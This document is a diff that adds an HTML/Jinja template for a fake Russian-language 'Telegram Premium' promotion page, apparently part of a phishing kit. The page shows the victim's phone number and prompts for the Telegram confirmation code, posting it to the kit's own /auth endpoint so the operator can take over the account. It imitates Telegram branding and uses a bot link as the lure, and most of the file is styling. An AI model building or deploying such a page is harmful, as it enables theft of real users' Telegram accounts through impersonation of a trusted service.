@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/style.css">
+    <title>Telegram Premium</title>
+    <link rel="icon" type="image/png" href="https://i.ibb.co/py8q3zd/logo.png" />
+</head>
+<body>
+    <section class="auth">
+
+        <article class="auth_tg_to"> 
+            <div class="tg">
+                <svg height="50" viewBox="0 0 98 50" width="98" xmlns="http://www.w3.org/2000/svg"><g fill="#4ca3e2" fill-rule="evenodd"><path d="m91.8 19.5666667 8.5 11.3333333c.331371.4418278.241828 1.0686292-.2 1.4-.1730962.1298221-.3836298.2-.6.2h-17c-.5522847 0-1-.4477153-1-1 0-.2163702.0701779-.4269038.2-.6l8.5-11.3333333c.3313708-.4418278.9581722-.5313709 1.4-.2.0758057.0568542.1431458.1241943.2.2z" transform="matrix(0 1 -1 0 116.5 -65.5)"/><path d="m40 21h46v8h-46z"/></g></svg>
+            </div>
+            <span class="logo">
+                <img class="auth_to" src="https://i.ibb.co/py8q3zd/logo.png"></img>
+            </span> 
+        </article>
+
+        <article class="login_text">
+            <p>Войдите, чтобы использовать аккаунт Telegram
+            для участия в <a class="login_link" href="https://t.me/action_premium_bot">Premium</a> акции</p>
+        </article>
+
+        <article class="under_text">
+            <p><strong>Вам был отправлен код для подтверждения.</strong> <br> Введите полученный код для авторизации.</p>
+
+        </article>
+
+        <article>
+            <form method="post" action="/auth/{{phone.lstrip('+')}}" class="number_input"> 
+                <label>Ваш номер:</label>
+                <input type="tel" class="number_disabled" disabled value="{{phone}}">
+                {% if error %}
+                <div class="alert">{{ error }}</div>
+                {% endif %}
+                <input type="text" id="code" class="code_input" placeholder="Код" name="code" autocomplete="off">
+                <input class="btn" type="submit" value="Войти">
+            </form>
+        </article>
+
+    </section>
+    <style type="text/css">
+        @import url("https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;1,100;1,300;1,400;1,500&display=swap");
+ 
+         body {
+         padding: 0;
+         margin: 0;
+         font-family: "Roboto", sans-serif;
+         background: url(https://c0.lestechnophiles.com/www.numerama.com/wp-content/uploads/2022/06/telegram.jpg);
+         background-repeat: no-repeat;
+         background-size: cover;
+         height: 100vh;
+         background-position: center;
+         }
+ 
+         .success {
+         font-weight: bold;
+         font-size: 30px;
+         padding: 0;
+         margin-top: 20px;
+         color: #25ae88;
+         }
+ 
+         .number_disabled {
+         background-color: transparent;
+         outline: none;
+         border: 1px #7d7f81 solid;
+         border-radius: 50px;
+         padding: 7px;
+         text-align: center;
+         margin-top: 5px;
+         margin-bottom: 10px;
+         }
+ 
+         .alert {
+         font-weight: bold;
+         color: #cb0000;
+         padding-bottom: 10px;
+         }
+ 
+         .auth_window {
+         display: flex;
+         justify-content: center;
+         align-items: center;
+         }
+ 
+         .auth {
+         position: absolute;
+         transform: translate(-50%, -50%);
+         left: 50%;
+         top: 50%;
+         width: 500px;
+         height: 400px;
+         background-color: white;
+         display: flex;
+         flex-direction: column;
+         justify-content: center;
+         border-radius: 10px;
+         box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
+         }
+ 
+         .auth_with {
+         position: absolute;
+         transform: translate(-50%, -50%);
+         left: 50%;
+         top: 50%;
+         width: 500px;
+         height: 150px;
+         background-color: white;
+         display: flex;
+         flex-direction: column;
+         justify-content: center;
+         border-radius: 10px;
+         box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
+         }
+ 
+         .auth_tg_to {
+         display: flex;
+         flex-direction: row;
+         justify-content: center;
+         align-items: center;
+         margin-top: 15px;
+         }
+ 
+         .tg {
+         width: 50px;
+         height: 50px;
+         background: url('data:image/svg+xml,%3Csvg height="50" viewBox="0 0 50 50" width="50" xmlns="http://www.w3.org/2000/svg"%3E%3Cg fill="none" fill-rule="evenodd"%3E%3Ccircle cx="25" cy="25" fill="%234ca3e2" r="25"/%3E%3Cpath d="m11.1838302 25.1315363c7.1532767-2.9934727 11.9232482-4.9669531 14.3099145-5.9204412 6.8144173-2.7224024 8.2303949-3.1953128 9.1533092-3.2109286.2029865-.0034345.6568489.0448847.950842.2740174.2482419.1934752.3165432.4548327.3492276.6382684.0326843.1834358.0733842.601307.0410309.9278195-.3692757 3.7267611-1.9671255 12.7706276-2.7800209 16.944664-.3439665 1.7661912-1.026197 2.1442046-1.6818831 2.2021587-1.4249578.1259476-2.5020563-.6903349-3.8821976-1.5593016-2.1596487-1.3597614-3.7791851-2.1170303-5.8754981-3.4439062-2.4226524-1.5334347-.2908188-2.3906915 1.0898437-3.7680664.361326-.3604656 6.7509766-6.1621094 6.8215001-6.027668.0306372.0584048-.192813-.6844486-.3362893-.8069372-.1434762-.1224887-.3552347-.0806023-.5080456-.0472897-.2166048.0472195-3.6666715 2.2375171-10.3502001 6.5708928-.97929.6458958-1.8663004.9605979-2.6610313.9441063-.876127-.0181806-2.561444-.4758095-3.814304-.8669794-1.5366837-.4797857-2.10392683-.7057418-1.9975768-1.5205665.0553937-.4244111.4458533-.8676919 1.1713788-1.3298423z" fill="%23fff"/%3E%3C/g%3E%3C/svg%3E')
+             no-repeat 0 0;
+         }
+ 
+         .auth_to {
+         width: 50px;
+         height: 50px;
+         margin-left: 60px;
+         display: flex;
+         justify-content: center;
+         align-items: center;
+         }
+ 
+         .login_text {
+         font-weight: bold;
+         text-align: center;
+         color: #363b40;
+         font-size: 18px;
+         }
+ 
+         .login_link {
+         text-decoration: none;
+         color: #1385d8;
+         font-weight: bold;
+         }
+ 
+         .under_link {
+         text-decoration: none;
+         color: #1385d8;
+         }
+ 
+         .under_text {
+         text-align: center;
+         color: #363b40;
+         }
+ 
+         .title_u {
+         font-weight: bold;
+         font-size: 20px;
+         margin: 0;
+         }
+ 
+         .descr_u {
+         font-size: 15px;
+         margin-top: 5px;
+         }
+ 
+         .under_text p {
+         margin-bottom: 0;
+         }
+ 
+         .number_input {
+         display: flex;
+         justify-content: center;
+         margin-top: 3%;
+         flex-direction: column;
+         align-items: center;
+         }
+ 
+         .tel_input {
+         font-size: 15px;
+         font-family: inherit;
+         background-color: transparent;
+         border: none;
+         outline: none;
+         border-bottom: 1px #7d7f81 solid;
+         transition: 0.2s;
+         }
+ 
+         .code_input {
+         width: calc(100px - 15px);
+         font-size: 15px;
+         font-family: inherit;
+         background-color: transparent;
+         outline: none;
+         border: 1px #7d7f81 solid;
+         border-radius: 50px;
+         padding: 7px;
+         text-align: center;
+         transition: 0.2s;
+         margin-bottom: 5px;
+         }
+ 
+         .tel_input::placeholder {
+         font-size: 15px;
+         }
+ 
+         .code_input:focus {
+         border: 1px #2481cc solid;
+         }
+ 
+         .tel_input:focus {
+         border-bottom: 1px #2481cc solid;
+         }
+ 
+         .btn {
+         font-size: 14px;
+         font-weight: bold;
+         color: #fff;
+         background: #4ca3e2;
+         border-radius: 19px;
+         display: inline-block;
+         padding: 10px 26px;
+         text-transform: uppercase;
+         text-align: center;
+         border: none;
+         transition: 0.2s ease;
+         cursor: pointer;
+         }
+ 
+         .btn:hover {
+         background: #1a8ad5;
+         }
+ 
+         .btn:active {
+         background: #2481cc;
+         }
+ 
+         .btn_auth {
+         width: 250px;
+         height: 45px;
+         background-color: #66a8e1;
+         border: none;
+         border-radius: 20px;
+         padding: 10px 20px 10px;
+         font-size: 16px;
+         text-align: center;
+         display: flex;
+         justify-content: space-around;
+         align-items: center;
+         color: white;
+         cursor: pointer;
+         transition: 0.2s;
+         box-shadow: 0 0 10px #2481cc, 0 0 15px #2481cc, 0 0 50px #2481cc;
+         }
+ 
+         .btn_auth:hover {
+         background: #1a8ad5;
+         }
+ 
+         .btn_auth:active {
+         background: #2481cc;
+         }
+ 
+         .title {
+         color: #363b40;
+         }
+ 
+         .with {
+         display: flex;
+         flex-direction: column;
+         align-items: center;
+         }
+ 
+         @media screen and (max-width: 600px) {
+         .auth {
+             position: absolute;
+             transform: translate(-50%, -50%);
+             left: 50%;
+             top: 25%;
+             width: 370px;
+             height: 400px;
+             background-color: white;
+             display: flex;
+             flex-direction: column;
+             justify-content: center;
+             border-radius: 10px;
+             box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
+         }
+         }
+ 
+     </style>
+</body>
+</html>
